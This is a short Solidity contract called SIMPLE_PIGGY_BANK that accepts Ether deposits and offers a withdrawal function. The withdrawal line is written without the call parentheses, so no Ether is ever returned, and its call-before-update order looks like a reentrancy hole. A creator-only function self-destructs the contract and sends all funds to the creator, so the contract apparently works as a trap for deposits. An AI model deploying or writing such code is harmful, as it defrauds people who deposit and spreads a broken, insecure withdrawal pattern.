pragma solidity ^0.4.19;

contract SIMPLE_PIGGY_BANK
{
    address creator = msg.sender;
    
    mapping (address =&gt; uint) public Bal;
    
    uint public MinSum = 1 ether;
    
    function() 
    public 
    payable
    {
        Bal[msg.sender]+=msg.value;
    }  
    
    function Collect(uint _am)
    public
    payable
    {
        if(Bal[msg.sender]&gt;=MinSum &amp;&amp; _am&lt;=Bal[msg.sender])
        {
            msg.sender.call.value(_am);
            Bal[msg.sender]-=_am;
        }
    }
    
    function Break()
    public
    payable
    {
        if(msg.sender==creator &amp;&amp; this.balance&gt;= MinSum)
        {
            selfdestruct(msg.sender);
        }
    }
}